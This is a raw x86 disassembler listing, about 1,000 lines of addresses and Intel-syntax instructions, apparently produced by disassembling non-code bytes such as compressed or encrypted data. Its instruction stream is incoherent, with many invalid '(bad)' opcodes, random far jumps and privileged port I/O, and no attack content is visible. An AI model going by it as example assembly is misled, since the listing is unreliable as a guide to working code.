  4152ba:	pop    ebx
  4152bb:	and    cl,ah
  4152bd:	js     0x415322
  4152bf:	retf   0x9707
  4152c2:	loope  0x4152f4
  4152c4:	mov    BYTE PTR [ebx+edx*1+0x392243f4],ch
  4152cb:	jp     0x41525c
  4152cd:	sbb    ah,BYTE PTR [ebx+0x9]
  4152d0:	clc    
  4152d1:	sbb    DWORD PTR [edx+0x4de09d07],edx
  4152d7:	mov    bl,0xb8
  4152d9:	jmp    0x4152a8
  4152db:	(bad)  
  4152dc:	in     al,0x56
  4152de:	imul   esi,DWORD PTR [ebp+ebx*8+0x46144c6f],0xffffffc0
  4152e6:	mov    ebx,0xb0d3a795
  4152eb:	push   esi
  4152ec:	jns    0x4152bf
  4152ee:	pusha  
  4152ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152f0:	lods   al,BYTE PTR ds:[esi]
  4152f1:	sbb    ecx,esi
  4152f3:	in     eax,dx
  4152f4:	fadd   st(5),st
  4152f6:	call   0x3a17:0x1676ee70
  4152fd:	pusha  
  4152fe:	and    esi,0x69
  415301:	nop
  415302:	dec    esi
  415303:	jle    0x415296
  415305:	xchg   WORD PTR [ebp+0x2c9b80a3],bp
  41530c:	jne    0x4152e5
  41530e:	cbw    
  415310:	loope  0x415386
  415312:	pop    ebx
  415313:	out    dx,al
  415314:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415315:	int3   
  415316:	ins    BYTE PTR es:[edi],dx
  415317:	pop    ss
  415318:	cs mov edi,0xb28ac7d6
  41531e:	jle    0x415395
  415320:	std    
  415321:	mov    ds,WORD PTR [ebx+edx*1]
  415324:	pop    ss
  415325:	pop    ds
  415326:	stos   BYTE PTR es:[edi],al
  415327:	jb     0x415354
  415329:	add    al,0x8
  41532b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41532c:	pop    ds
  41532d:	cli    
  41532e:	jecxz  0x415339
  415330:	fldenv [eax]
  415332:	cmp    BYTE PTR [eax],0x4c
  415335:	sbb    al,BYTE PTR [ebx]
  415337:	mov    WORD PTR [ebp+0x35b4534e],es
  41533d:	pop    ss
  41533e:	mov    eax,ds:0xb409e452
  415343:	(bad)  
  415344:	ds loopne 0x4153b2
  415347:	mov    al,es:0xc4fad7d
  41534d:	(bad)  
  41534e:	or     al,0xa6
  415350:	aad    0x77
  415352:	or     ch,BYTE PTR [ebx+0x2a]
  415355:	sub    DWORD PTR [edi],esi
  415357:	aam    0x31
  415359:	mov    al,ds:0x58d8f737
  41535e:	daa    
  41535f:	mov    dh,0xf2
  415361:	bound  ebx,QWORD PTR [esi+0x2ac8cd56]
  415367:	jo     0x4153b8
  415369:	xchg   esi,eax
  41536a:	(bad)  
  41536b:	sub    BYTE PTR [esp+esi*2+0x5edff573],dl
  415372:	adc    DWORD PTR [edi],edi
  415374:	pop    edx
  415375:	bound  eax,QWORD PTR [edx+ecx*1-0x5b]
  415379:	in     eax,dx
  41537a:	aad    0x54
  41537c:	aam    0x3a
  41537e:	ins    BYTE PTR es:[edi],dx
  41537f:	jnp    0x415341
  415381:	dec    ecx
  415382:	adc    edi,DWORD PTR [esi]
  415384:	fisubr DWORD PTR [esi-0x7b8595ab]
  41538a:	xchg   esp,ecx
  41538c:	(bad)  
  41538d:	sahf   
  41538e:	rcl    DWORD PTR [eax],0x77
  415391:	(bad)  
  415392:	aad    0xba
  415394:	xchg   DWORD PTR [edx+0x13e1d38e],eax
  41539a:	in     al,dx
  41539b:	shr    BYTE PTR [edi],1
  41539d:	(bad)  
  41539e:	xor    eax,esi
  4153a0:	bound  eax,QWORD PTR [ebp-0x7a]
  4153a3:	int    0xc4
  4153a5:	xchg   eax,ecx
  4153a7:	call   0x4d193629
  4153ac:	in     eax,dx
  4153ad:	lds    ebx,FWORD PTR [esi+ecx*8]
  4153b0:	data16 mov bh,0x86
  4153b3:	enter  0x710c,0x5b
  4153b7:	shr    DWORD PTR [ebx],cl
  4153b9:	out    0xd0,eax
  4153bb:	jmp    0xd7fe930f
  4153c0:	sbb    al,0xc9
  4153c2:	inc    ebp
  4153c3:	cld    
  4153c4:	jmp    0x415440
  4153c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153c7:	aas    
  4153c8:	repnz rol DWORD PTR [ebx+0x38],0xa3
  4153cd:	scas   eax,DWORD PTR es:[edi]
  4153ce:	dec    edi
  4153cf:	pop    eax
  4153d0:	push   esi
  4153d1:	inc    esi
  4153d2:	push   ebx
  4153d3:	bnd jne 0x4153e3
  4153d6:	mov    ebx,0xb0091c99
  4153db:	pop    eax
  4153dc:	sbb    bl,0x27
  4153df:	ds sti 
  4153e1:	or     edx,ecx
  4153e3:	fs scas eax,DWORD PTR es:[edi]
  4153e5:	rcr    DWORD PTR [ebp+ebx*2-0xc5e633f],cl
  4153ec:	sbb    eax,0x475ac30d
  4153f1:	or     eax,0xf22942e1
  4153f6:	enter  0xf684,0x33
  4153fa:	cwde   
  4153fb:	fsubp  st(6),st
  4153fd:	aad    0x62
  4153ff:	out    0x8f,eax
  415401:	fs push cs
  415403:	es mov ebx,ds
  415406:	jecxz  0x4153f8
  415408:	jp     0x415412
  41540a:	sub    al,0x8f
  41540c:	xor    eax,0xc0d4f7dc
  415411:	dec    ebp
  415412:	outs   dx,DWORD PTR ds:[esi]
  415413:	(bad)  
  415415:	jp     0x4153db
  415417:	pop    ds
  415418:	cmc    
  415419:	mov    ds:0x91898930,eax
  41541e:	(bad)  
  41541f:	pop    edi
  415420:	mov    bh,0xae
  415422:	push   esi
  415423:	hlt    
  415424:	(bad)  [ebp+ebp*2+0x200b813]
  41542b:	nop
  41542c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41542d:	call   0x988e683e
  415432:	sahf   
  415433:	adc    dh,dl
  415435:	xlat   BYTE PTR ds:[ebx]
  415436:	cmp    al,0x5b
  415438:	push   ds
  415439:	outs   dx,DWORD PTR ds:[esi]
  41543a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41543b:	mov    bh,0x33
  41543d:	call   0xce7e:0x25458c1f
  415444:	rol    BYTE PTR [ebx],0xfb
  415447:	addr16 jb 0x41542a
  41544a:	push   cs
  41544b:	ret    
  41544c:	mov    bl,0x3a
  41544e:	jno    0x415433
  415450:	out    0xe4,al
  415452:	jb     0x415473
  415454:	imul   edx,DWORD PTR [eax-0x3447b6c2],0x13
  41545b:	adc    eax,0x453ce85a
  415460:	xor    ch,BYTE PTR [si]
  415463:	dec    ebx
  415464:	gs xor eax,0xc8c09807
  41546a:	movzx  ebx,ch
  41546d:	pop    edx
  41546e:	pop    es
  41546f:	cli    
  415470:	lock pop edi
  415472:	and    esp,DWORD PTR [edi+edi*8]
  415475:	out    dx,al
  415476:	outs   dx,DWORD PTR ds:[esi]
  415477:	sub    al,0xec
  415479:	ins    DWORD PTR es:[edi],dx
  41547a:	clc    
  41547b:	mov    BYTE PTR [edx+0x73],dl
  41547e:	inc    DWORD PTR [ebp-0x31]
  415481:	loop   0x415423
  415483:	adc    al,0xb3
  415485:	aas    
  415486:	stos   DWORD PTR es:[edi],eax
  415487:	jmp    0xd95e2184
  41548c:	push   ss
  41548d:	and    eax,0xe63b7dfd
  415492:	das    
  415493:	loopne 0x4154a3
  415495:	mov    BYTE PTR [ebp-0x72],ah
  415498:	xchg   ebx,eax
  415499:	test   eax,0xdbe6b464
  41549e:	jb     0x415466
  4154a0:	cmp    DWORD PTR [eax+0xc],esp
  4154a3:	not    BYTE PTR [esi+0x5919f5a4]
  4154a9:	jl     0x2fa475d9
  4154af:	sti    
  4154b0:	adc    al,BYTE PTR fs:0xe553736c
  4154b7:	ins    BYTE PTR es:[edi],dx
  4154b8:	aad    0x75
  4154ba:	mov    ebp,0x384d1e3d
  4154bf:	add    cl,BYTE PTR [esi+0x1a069daf]
  4154c5:	retf   0x181
  4154c8:	mov    ah,0xf5
  4154ca:	shl    BYTE PTR [esi],1
  4154cc:	jo     0x4154aa
  4154ce:	jp     0x41547e
  4154d0:	mov    BYTE PTR [ecx-0x26],cl
  4154d3:	pop    ebx
  4154d4:	lods   eax,DWORD PTR ds:[esi]
  4154d5:	dec    esp
  4154d6:	adc    BYTE PTR [esi],bl
  4154d8:	test   BYTE PTR [esp+eiz*2+0x114dfb32],ch
  4154df:	dec    eax
  4154e0:	leave  
  4154e1:	xchg   esi,eax
  4154e2:	and    esi,ebx
  4154e4:	leave  
  4154e5:	mov    edi,0x51f5d1dc
  4154ea:	sbb    edx,DWORD PTR [ecx-0x1d2866a5]
  4154f0:	cmp    al,0xd1
  4154f2:	cmp    ebp,esp
  4154f4:	adc    ch,BYTE PTR [ebx]
  4154f6:	inc    esp
  4154f7:	stc    
  4154f8:	xor    DWORD PTR [eax],esp
  4154fa:	sti    
  4154fb:	inc    esp
  4154fc:	nop
  4154fd:	mov    dh,0xe0
  4154ff:	dec    ebx
  415500:	cmp    eax,0xa9752564
  415505:	mov    al,ds:0xe11043e7
  41550a:	jne    0x4154b9
  41550c:	es jo  0x41557b
  41550f:	add    ch,BYTE PTR [edx+0x29b4b541]
  415515:	push   esp
  415516:	nop
  415517:	std    
  415518:	es sbb eax,0xe70102ad
  41551e:	sbb    al,0xfa
  415520:	push   ds
  415521:	jge    0x41556e
  415523:	int3   
  415524:	mov    eax,ds:0xc2a04d92
  415529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41552a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41552b:	mov    bl,0x30
  41552d:	mov    ds:0xfab85de6,al
  415532:	inc    edi
  415533:	sbb    ah,BYTE PTR [edi-0x4853000]
  415539:	das    
  41553a:	mov    esp,0x852a94d1
  41553f:	ror    BYTE PTR [ecx],cl
  415541:	xchg   esp,eax
  415542:	pop    es
  415543:	fisttp WORD PTR [ebx-0x58]
  415546:	inc    eax
  415547:	mov    eax,ds:0xdc53e8f9
  41554c:	fs mov al,0xc
  41554f:	sbb    DWORD PTR [eax],eax
  415551:	pop    ss
  415552:	leave  
  415553:	nop
  415554:	inc    esi
  415555:	push   ebp
  415556:	mov    al,0xa9
  415558:	push   edi
  415559:	inc    esi
  41555a:	mov    edx,0x9ad15fee
  41555f:	idiv   DWORD PTR [ebx-0x75]
  415562:	xchg   edi,eax
  415563:	dec    esp
  415564:	sbb    DWORD PTR [eax],esi
  415566:	aas    
  415567:	dec    edi
  415568:	ins    BYTE PTR es:[edi],dx
  415569:	fs ja  0x415541
  41556c:	rcr    DWORD PTR [ebx],cl
  41556e:	(bad)  
  41556f:	pop    ebx
  415570:	ja     0x415588
  415572:	sar    ecx,cl
  415574:	pop    eax
  415575:	fisub  DWORD PTR [esi-0x7166439]
  41557b:	test   edi,0x1fd07030
  415581:	xchg   ebx,eax
  415582:	add    eax,0x3024baab
  415587:	adc    eax,0x559d6d1c
  41558c:	mov    esp,0xe1b82309
  415591:	inc    esi
  415592:	pop    ds
  415593:	xchg   ecx,eax
  415594:	mov    dl,0xaf
  415596:	xchg   ebp,eax
  415597:	ins    DWORD PTR es:[edi],dx
  415598:	xchg   edi,eax
  415599:	pushaw 
  41559b:	add    edx,DWORD PTR [edx-0x7f]
  41559e:	sbb    DWORD PTR [edi+0x10],0xffffffb8
  4155a2:	lahf   
  4155a3:	neg    BYTE PTR [ecx]
  4155a5:	sub    ecx,DWORD PTR [ecx]
  4155a7:	or     cl,BYTE PTR [eax-0x53878bbc]
  4155ad:	pop    edx
  4155ae:	iret   
  4155af:	add    BYTE PTR [edx+0x5c],cl
  4155b2:	cmp    al,0x31
  4155b4:	loope  0x415577
  4155b6:	mov    WORD PTR [ebx-0x2],?
  4155b9:	or     al,0xf0
  4155bb:	xchg   edx,eax
  4155bc:	mov    bh,0xea
  4155be:	adc    BYTE PTR [esi],ch
  4155c0:	mov    bh,al
  4155c2:	mov    esp,0xf6ed3f5b
  4155c7:	sub    eax,0x44c11d5b
  4155cc:	rcl    BYTE PTR fs:[esp+esi*1+0x3f],1
  4155d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155d2:	in     eax,0x59
  4155d4:	shl    BYTE PTR [edx+0x75a3bb7f],1
  4155da:	xor    ah,al
  4155dc:	ins    BYTE PTR es:[edi],dx
  4155dd:	scas   eax,DWORD PTR es:[edi]
  4155de:	pop    ebx
  4155df:	jge    0x41558d
  4155e1:	push   ds
  4155e2:	in     eax,0x70
  4155e4:	jmp    0x15a0dd4b
  4155e9:	int3   
  4155ea:	shl    BYTE PTR [ecx+esi*8],0x59
  4155ee:	repnz xchg dh,dl
  4155f1:	jb     0x41560b
  4155f3:	pop    edx
  4155f4:	mov    bh,0xe8
  4155f6:	push   sp
  4155f8:	cli    
  4155f9:	mov    ds:0x27089765,al
  4155fe:	inc    edx
  4155ff:	push   edi
  415600:	fistp  DWORD PTR [edi-0x7f]
  415603:	add    eax,0x7e485473
  415608:	shl    BYTE PTR [ebp+0x32],cl
  41560b:	or     eax,0x400b2a9
  415610:	and    cl,BYTE PTR [ecx-0x2aafe665]
  415616:	xchg   edi,eax
  415617:	(bad)  
  415618:	or     ecx,ebx
  41561a:	sar    BYTE PTR [eax],1
  41561c:	mov    edx,0x1972218f
  415621:	shl    DWORD PTR [edi],1
  415623:	pop    ss
  415624:	mov    eax,ds:0xad4d7d71
  415629:	mov    ds:0xce782cee,al
  41562e:	push   cs
  41562f:	xchg   ebp,ebx
  415631:	lahf   
  415632:	push   esp
  415633:	and    DWORD PTR [edi+0x1610b17a],esp
  415639:	jp     0x4155c7
  41563b:	sbb    al,0x96
  41563d:	ja     0x415669
  41563f:	jnp    0x41569a
  415641:	hlt    
  415642:	fmul   st(6),st
  415644:	(bad)  
  415645:	mov    ds:0xcd732402,al
  41564a:	push   ss
  41564b:	sbb    DWORD PTR [eax-0x49841810],ecx
  415651:	push   esp
  415652:	loope  0x4155f1
  415654:	sti    
  415655:	push   0xffffff88
  415657:	out    dx,eax
  415658:	mov    BYTE PTR [ecx+edx*1-0x4528e0b9],ch
  41565f:	cmp    DWORD PTR [ecx-0x4347ca8b],eax
  415665:	adc    BYTE PTR [esi],al
  415667:	mov    eax,0x32190e11
  41566c:	iret   
  41566d:	sub    BYTE PTR [ebx-0x1450f2a],0xd7
  415674:	dec    ecx
  415675:	and    eax,0xc55427f3
  41567a:	mov    esi,0xf917ede6
  41567f:	xor    ebp,DWORD PTR [ebx-0x3ac9de8b]
  415685:	in     al,0x47
  415687:	retf   
  415688:	and    BYTE PTR [edi],al
  41568a:	mov    dl,0x68
  41568c:	ror    DWORD PTR [esi+0x6f],1
  41568f:	imul   eax,DWORD PTR [eax],0x5c99d849
  415695:	push   edx
  415696:	pop    eax
  415697:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415698:	call   0x5052:0xcf02a057
  41569f:	mov    al,ds:0xf2be4e5a
  4156a4:	xor    edi,edi
  4156a6:	or     eax,0x2947174b
  4156ab:	pop    esi
  4156ac:	jmp    FWORD PTR [ebp+0x6d11e7c9]
  4156b2:	in     eax,0xa4
  4156b4:	outs   dx,BYTE PTR ds:[esi]
  4156b5:	aam    0xa3
  4156b7:	(bad)  
  4156b8:	and    bl,ch
  4156ba:	inc    eax
  4156bb:	pop    es
  4156bc:	jge    0x4156ce
  4156be:	loop   0x4156d7
  4156c0:	test   al,al
  4156c2:	jg     0x4156d1
  4156c4:	daa    
  4156c5:	xchg   dl,bh
  4156c7:	inc    edi
  4156c8:	daa    
  4156c9:	repz inc esp
  4156cb:	xor    al,0xf
  4156cd:	ret    
  4156ce:	or     bl,BYTE PTR [ebp-0x2e]
  4156d1:	jecxz  0x4156c8
  4156d3:	pop    ebp
  4156d4:	not    DWORD PTR [edi+eiz*2+0xd]
  4156d8:	jnp    0x415697
  4156da:	sub    BYTE PTR [eax],ch
  4156dc:	and    cl,BYTE PTR ds:0x9be73127
  4156e2:	mov    cl,0xd4
  4156e4:	mov    ebx,0x113bb53e
  4156e9:	lock or di,WORD PTR [edi+0x65]
  4156ee:	push   ebx
  4156ef:	pop    eax
  4156f0:	jmp    0x882d:0xdf7df476
  4156f7:	inc    esp
  4156f8:	push   edx
  4156f9:	outs   dx,DWORD PTR ds:[esi]
  4156fa:	add    esi,esp
  4156fc:	jmp    0x3388:0xb6ae103f
  415703:	jmp    0xfbb77638
  415708:	rcl    ecx,cl
  41570a:	xchg   DWORD PTR [eax-0x1c583913],eax
  415710:	mov    ebx,0xdd19f211
  415715:	test   al,0x75
  415717:	xchg   DWORD PTR [ebx],ecx
  415719:	das    
  41571a:	out    0xae,al
  41571c:	ins    BYTE PTR es:[edi],dx
  41571d:	loop   0x415793
  41571f:	mov    ebp,es
  415721:	adc    BYTE PTR [edx],ch
  415723:	adc    al,0x63
  415725:	test   DWORD PTR [ebx],ebx
  415727:	dec    ebp
  415728:	adc    bl,BYTE PTR [ecx]
  41572a:	xor    al,0xf2
  41572c:	adc    ebp,esi
  41572e:	sti    
  41572f:	xchg   esp,eax
  415730:	pop    es
  415731:	loopne 0x4156cf
  415733:	and    edi,ecx
  415735:	test   DWORD PTR [ebx],edi
  415737:	xlat   BYTE PTR ds:[ebx]
  415738:	adc    DWORD PTR [edx-0x37],esi
  41573b:	jmp    0x23da1687
  415740:	pop    edx
  415741:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415742:	je     0x41570c
  415744:	sub    edx,ecx
  415746:	lock adc ecx,DWORD PTR [edi]
  415749:	adc    al,0xbf
  41574b:	cwde   
  41574c:	retf   0xf42e
  41574f:	mov    esp,0x25d588c3
  415754:	sbb    DWORD PTR [eax+0x5],eax
  415757:	fnsave [eax-0x521036ee]
  41575d:	cmp    BYTE PTR [ecx+0x4fd01ac],al
  415763:	mov    dh,0xa4
  415765:	xchg   ebp,eax
  415766:	shl    DWORD PTR ds:0xa4ad4de8,1
  41576c:	jmp    0x415758
  41576e:	(bad)  
  41576f:	(bad)  
  415770:	jp     0x41578c
  415772:	enter  0xb27c,0x83
  415776:	test   al,0x14
  415778:	int    0xf3
  41577a:	dec    ebp
  41577b:	pusha  
  41577c:	adc    BYTE PTR [edx+0x69e7fecd],bh
  415782:	jl     0x41579c
  415784:	push   edi
  415785:	mov    esi,0xa78a2aa0
  41578a:	push   es
  41578b:	add    BYTE PTR [edi+0x37fc7d08],dl
  415791:	jo     0x415807
  415793:	pop    edi
  415794:	sahf   
  415795:	stos   BYTE PTR es:[edi],al
  415796:	mov    esp,0xf5282488
  41579b:	pop    ss
  41579c:	or     cl,BYTE PTR [esi+edi*8+0xd1a858b]
  4157a3:	inc    esp
  4157a4:	mov    ebp,0x627a8f5f
  4157a9:	mov    dh,0x2e
  4157ab:	aad    0xaf
  4157ad:	cli    
  4157ae:	xchg   esi,eax
  4157af:	mov    esi,0xc8255002
  4157b4:	mov    ah,0xb
  4157b6:	(bad)  
  4157b7:	icebp  
  4157b8:	(bad)  
  4157b9:	popf   
  4157ba:	add    ebx,DWORD PTR [ecx]
  4157bc:	mov    ds:0xca19bfd4,eax
  4157c1:	xchg   edi,eax
  4157c2:	cmp    al,0x96
  4157c4:	ror    DWORD PTR [esi+0x6bb937a3],1
  4157ca:	data16 cld 
  4157cc:	xor    cl,BYTE PTR [ebx]
  4157ce:	mov    esi,0x92ae0bd4
  4157d3:	sbb    BYTE PTR [edx+edx*1+0x55],dl
  4157d7:	adc    cl,BYTE PTR [esp+ecx*1+0x23]
  4157db:	push   esi
  4157dc:	jae    0x4157ff
  4157de:	jmp    0xbbabeeba
  4157e3:	call   0x44cf:0x7d00e012
  4157ea:	sub    DWORD PTR ds:0x73de8b8f,ecx
  4157f0:	sti    
  4157f1:	psubusb mm4,QWORD PTR [ebx-0x78]
  4157f5:	je     0x415811
  4157f7:	into   
  4157f8:	sub    dh,BYTE PTR [edi+0x18]
  4157fb:	xor    eax,0x9c4b789b
  415800:	mov    ebp,0x574b675d
  415805:	jl     0x4157ca
  415807:	retf   
  415808:	in     eax,dx
  415809:	cmp    DWORD PTR [edi-0x33],esi
  41580c:	jns    0x4157da
  41580e:	xchg   ecx,eax
  41580f:	fmul   QWORD PTR [ecx-0x6c8d5671]
  415815:	adc    eax,0xaed69ef
  41581a:	les    ebp,FWORD PTR [edi]
  41581c:	pop    edi
  41581d:	cmp    dh,BYTE PTR [ecx+0x41ccc178]
  415823:	cld    
  415824:	call   0x36f3:0x88bfe5fe
  41582b:	inc    ebx
  41582c:	std    
  41582d:	jg     0x4157c0
  41582f:	push   cs
  415830:	mov    eax,0xbd17e4ec
  415835:	sub    eax,0xcbd7a4f9
  41583a:	lock leave 
  41583c:	repz mov ah,bh
  41583f:	push   edx
  415840:	popf   
  415841:	(bad)  
  415842:	jmp    0x41582c
  415844:	xor    BYTE PTR [ebx],ah
  415846:	ror    DWORD PTR [eax+esi*8+0x36],1
  41584a:	pop    ds
  41584b:	sub    eax,0x4d73c99e
  415850:	adc    DWORD PTR [ebx+0x4db11982],ebp
  415856:	jb     0x415899
  415858:	jg     0x415813
  41585a:	gs jb  0x4157ee
  41585d:	lods   eax,DWORD PTR ds:[esi]
  41585e:	fsubp  st(5),st
  415860:	cmp    DWORD PTR [edx],0x3d
  415863:	fdivr  DWORD PTR [ecx+0x68]
  415866:	mov    al,ds:0x68c721ec
  41586b:	xor    al,0x4
  41586d:	or     DWORD PTR [ebp-0x31],eax
  415870:	xchg   edi,eax
  415871:	retf   
  415872:	push   0xa41606e3
  415877:	int    0x5e
  415879:	push   ecx
  41587a:	mov    dh,0xe3
  41587c:	sub    al,0x7a
  41587e:	pop    ecx
  41587f:	push   edx
  415880:	inc    ebp
  415881:	fdiv   DWORD PTR [edi]
  415883:	lods   eax,DWORD PTR ds:[esi]
  415884:	data16 fild WORD PTR [ebx]
  415887:	sbb    eax,0xcc706193
  41588c:	cmp    eax,edi
  41588e:	push   edi
  41588f:	dec    esp
  415890:	pop    ecx
  415891:	(bad)  
  415892:	mov    eax,ds:0x9701da97
  415897:	xor    esi,edi
  415899:	dec    ebx
  41589a:	mov    al,0x64
  41589c:	xor    ebp,DWORD PTR [esi+0x5fcabdf1]
  4158a2:	test   eax,0xc5c28795
  4158a7:	ins    BYTE PTR es:[edi],dx
  4158a8:	sti    
  4158a9:	icebp  
  4158aa:	and    esi,DWORD PTR [ecx]
  4158ac:	arpl   WORD PTR [ebx+0x67],di
  4158af:	frstor [esi]
  4158b1:	popa   
  4158b2:	outs   dx,BYTE PTR ds:[esi]
  4158b3:	fstp   DWORD PTR [ecx-0x6fcefdd]
  4158b9:	and    eax,0xccd1d975
  4158be:	neg    BYTE PTR [esi]
  4158c0:	sbb    DWORD PTR [ebp-0x73],eax
  4158c3:	inc    edi
  4158c4:	leave  
  4158c5:	out    dx,al
  4158c6:	imul   esp,DWORD PTR [eax],0x79
  4158c9:	nop
  4158ca:	xlat   BYTE PTR ds:[ebx]
  4158cb:	sahf   
  4158cc:	call   0x76f4:0x6fe2c179
  4158d3:	push   0x86467334
  4158d8:	(bad)  
  4158d9:	mov    ah,0xb2
  4158db:	out    0x52,eax
  4158dd:	daa    
  4158de:	mov    eax,ds:0x1db85aae
  4158e3:	iret   
  4158e4:	mov    ecx,0x1834c108
  4158e9:	mov    BYTE PTR [edx-0x2f53ce4a],0xfa
  4158f0:	call   0x11f5c6fd
  4158f5:	sbb    dh,BYTE PTR [esi+0x59]
  4158f8:	gs fs xchg ecx,eax
  4158fb:	xchg   BYTE PTR [ebx+0x6bdce78],dh
  415901:	ret    
  415902:	pop    ds
  415903:	mov    ecx,0xfe2b6531
  415908:	das    
  415909:	pop    es
  41590a:	adc    edx,DWORD PTR [eax+0x6b696b84]
  415910:	sub    DWORD PTR [ecx+0x5],0xffffffab
  415914:	jl     0x4158b6
  415916:	xchg   ebp,eax
  415917:	dec    ebx
  415918:	daa    
  415919:	push   0xffffff81
  41591b:	es add al,0x15
  41591e:	into   
  41591f:	mov    ebp,0xffa1cf48
  415924:	mov    BYTE PTR [edi+0x27],dh
  415927:	jmp    0xdfe4:0x76aad24d
  41592e:	stc    
  41592f:	and    bl,cl
  415931:	jo     0x415915
  415933:	sub    ch,cl
  415935:	ds xchg ebx,esi
  415938:	loopne 0x415901
  41593a:	inc    esp
  41593b:	int3   
  41593c:	shl    BYTE PTR [eax+esi*4],0xf
  415940:	mov    dl,0xd3
  415942:	xchg   edi,eax
  415943:	std    
  415944:	xor    dh,BYTE PTR [esi+0x18]
  415947:	into   
  415948:	inc    ebx
  415949:	sub    DWORD PTR [ebx+esi*4-0x37],edi
  41594d:	mov    ds:0x8d570e31,al
  415952:	leave  
  415953:	or     BYTE PTR [edx+ecx*1],0x7d
  415957:	in     eax,0xe
  415959:	cmp    al,al
  41595b:	sbb    eax,0xcba6c0
  415960:	or     DWORD PTR [eax],ecx
  415962:	leave  
  415963:	jge    0x415920
  415965:	fbld   TBYTE PTR [edx-0x2d60968d]
  41596b:	sbb    eax,0xfe53d1c
  415970:	repz sbb DWORD PTR [ebx],0x98cb127b
  415977:	into   
  415978:	es push ds
  41597a:	sbb    ebx,edi
  41597c:	adc    eax,0x7ef9125
  415981:	int    0x6f
  415983:	mov    ebx,0xb7981b94
  415988:	jae    0x4159c4
  41598a:	push   ebx
  41598b:	sub    al,0xac
  41598d:	div    BYTE PTR [eax+eax*8+0x7a50f023]
  415994:	mov    esp,0xd6890320
  415999:	lea    esp,[edi-0xf]
  41599c:	pop    eax
  41599d:	dec    esp
  41599e:	(bad)  
  41599f:	ja     0x4159e1
  4159a1:	sti    
  4159a2:	hlt    
  4159a3:	dec    bh
  4159a5:	mov    al,ds:0xcae4a8f1
  4159aa:	add    DWORD PTR [ebx+0x63],esp
  4159ad:	ret    
  4159ae:	loope  0x415978
  4159b0:	inc    esp
  4159b1:	inc    ebx
  4159b2:	(bad)  
  4159b3:	out    dx,eax
  4159b4:	jbe    0x415a04
  4159b6:	cmp    ebx,DWORD PTR [edx]
  4159b8:	or     bh,BYTE PTR [esi]
  4159ba:	xchg   BYTE PTR [esi+esi*8+0x686f8828],cl
  4159c1:	inc    edi
  4159c2:	leave  
  4159c3:	aaa    
  4159c4:	mov    ebx,DWORD PTR [eax+0x5c]
  4159c7:	xchg   ebp,eax
  4159c8:	xchg   ebx,eax
  4159c9:	xchg   ebp,eax
  4159ca:	call   0x15c7851d
  4159cf:	sbb    eax,0xc0029878
  4159d4:	add    eax,0x35adc059
  4159d9:	mov    bl,0x36
  4159db:	sbb    ah,dh
  4159dd:	pop    es
  4159de:	dec    esi
  4159df:	jne    0x4159b6
  4159e1:	cwde   
  4159e2:	adc    eax,0x36ac6da1
  4159e7:	push   esi
  4159e8:	out    0xfb,al
  4159ea:	cld    
  4159eb:	arpl   WORD PTR [edi-0x20b5a213],di
  4159f1:	xchg   edi,eax
  4159f2:	mov    eax,ds:0xb696051d
  4159f7:	test   eax,0x2b36f4e0
  4159fc:	xlat   BYTE PTR ds:[ebx]
  4159fd:	or     BYTE PTR [ebx],ah
  4159ff:	in     eax,dx
  415a00:	xor    BYTE PTR [edx],ch
  415a02:	sahf   
  415a03:	in     eax,0xd
  415a05:	inc    edi
  415a06:	aas    
  415a07:	adc    DWORD PTR [ecx-0x2b],ecx
  415a0a:	sahf   
  415a0b:	mov    eax,0x85cd57db
  415a10:	mov    ss,WORD PTR [esi]
  415a12:	div    BYTE PTR ds:0x19d59975
  415a18:	loope  0x415a30
  415a1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a1b:	nop
  415a1c:	push   cs
  415a1d:	ret    0xead5
  415a20:	loopne 0x4159cb
  415a22:	inc    eax
  415a23:	xor    eax,0x219f048f
  415a28:	retf   
  415a29:	jmp    0x8281:0x36737a87
  415a30:	inc    ecx
  415a31:	in     al,dx
  415a32:	adc    al,0xef
  415a34:	add    BYTE PTR [edi-0x3d60f4ab],bh
  415a3a:	mov    ds:0xff3e9ba0,eax
  415a3f:	mov    DWORD PTR [ecx+0x3224d5c7],ebp
  415a45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a46:	jg     0x4159ce
  415a48:	pop    edx
  415a49:	push   edx
  415a4a:	pop    ecx
  415a4b:	stc    
  415a4c:	aad    0xb3
  415a4e:	sar    BYTE PTR [edi],cl
  415a50:	push   edx
  415a51:	sub    eax,0x36f771c4
  415a56:	dec    edi
  415a57:	sub    ebx,edi
  415a59:	scas   al,BYTE PTR es:[edi]
  415a5a:	push   esp
  415a5b:	cwde   
  415a5c:	popf   
  415a5d:	adc    ch,ah
  415a5f:	add    esi,ecx
  415a61:	adc    al,0xbd
  415a63:	repnz add bh,0x6
  415a67:	sub    al,0x3c
  415a69:	nop
  415a6a:	push   0x2b5a1de4
  415a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a70:	jno    0x415abf
  415a72:	hlt    
  415a73:	jl     0x415ae7
  415a75:	in     eax,dx
  415a76:	iret   
  415a77:	add    dh,BYTE PTR [ebp+0x459bf922]
  415a7d:	into   
  415a7e:	xor    eax,DWORD PTR ds:0xcc29fab5
  415a84:	fild   WORD PTR [eax]
  415a86:	das    
  415a87:	ret    0xb618
  415a8a:	sbb    esp,DWORD PTR [esi-0x13bbfebb]
  415a90:	nop
  415a91:	ror    dl,0x4d
  415a94:	rcl    bl,0x23
  415a97:	addr16 jl 0x415aa9
  415a9a:	arpl   WORD PTR [ebx+0x12082f78],cx
  415aa0:	push   edi
  415aa1:	mov    ch,0x57
  415aa3:	add    al,0x83
  415aa5:	jns    0x415a35
  415aa7:	in     eax,dx
  415aa8:	enter  0x96a0,0x11
  415aac:	jno    0x415ab6
  415aae:	push   esi
  415aaf:	cli    
  415ab0:	int3   
  415ab1:	push   cs
  415ab2:	push   esi
  415ab3:	dec    esi
